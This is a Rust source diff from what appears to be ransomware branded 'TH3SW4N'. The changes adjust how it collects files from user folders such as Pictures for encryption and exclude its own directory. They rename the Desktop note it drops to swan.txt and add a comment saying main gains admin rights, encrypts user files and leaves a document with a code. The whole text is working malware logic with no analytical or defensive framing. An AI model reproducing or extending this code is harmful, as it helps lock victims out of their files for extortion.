@@ -79,8 +79,6 @@ fn scan_directory(dir: impl AsRef<Path>, vec: Vec<String>, size_limit: u64) -> V
 fn get_user_files() -> Vec<String> {
     let mut user_files: Vec<String> = Vec::new();
     let mut user_directories: Vec<String> = Vec::new();
-    let current_directory = env::current_dir().unwrap().as_os_str().to_str().unwrap().to_string();
-    let mut important_files: Vec<String> = Vec::new();
 
     // Retrieves user directory
     fn get_user_directory() -> Option<PathBuf> {
@@ -114,15 +112,10 @@ fn get_user_files() -> Vec<String> {
         user_directories.push(pictures_dir.to_str().unwrap().to_string());
 
         for i in 0..user_directories.len() {
-            user_files = scan_directory(user_directories.get(i).unwrap(), user_files.clone(), 1024);
-        }
-
-        important_files = scan_directory(current_directory, important_files.clone(), 1024);
-
-        // Removes this programs file directories from the user_files to be encrypted
-        for i in 0..important_files.len() {
-            if user_files.contains(important_files.get(i).unwrap()) {
-                user_files.retain(|x| x != important_files.get(i).unwrap());
+            if user_directories.get(i).unwrap().contains("TH3SW4N") || user_directories.get(i).unwrap().contains("th3sw4n") {
+                eprintln!("Error locating user files in controller.rs...");
+            } else {
+                user_files = scan_directory(user_directories.get(i).unwrap(), user_files.clone(), 1024);
             }
         }
     }
@@ -273,7 +266,7 @@ pub fn remove_sys_files() {
     }
 }
 
-// Creates file name hatch.txt and adds to Desktop
+// Creates file name swan.txt and adds to Desktop
 fn create_desktop_document() {
     fn get_user_directory() -> Option<PathBuf> {
         match env::var_os("USERPROFILE") {
@@ -300,6 +293,7 @@ fn create_desktop_document() {
     }
 }
 
+// Executes main function which gather admin permissions before getting user files, encrypting, and creating document with code to TH3SW4N
 pub fn main() {
     run_as_admin();
     unsafe {
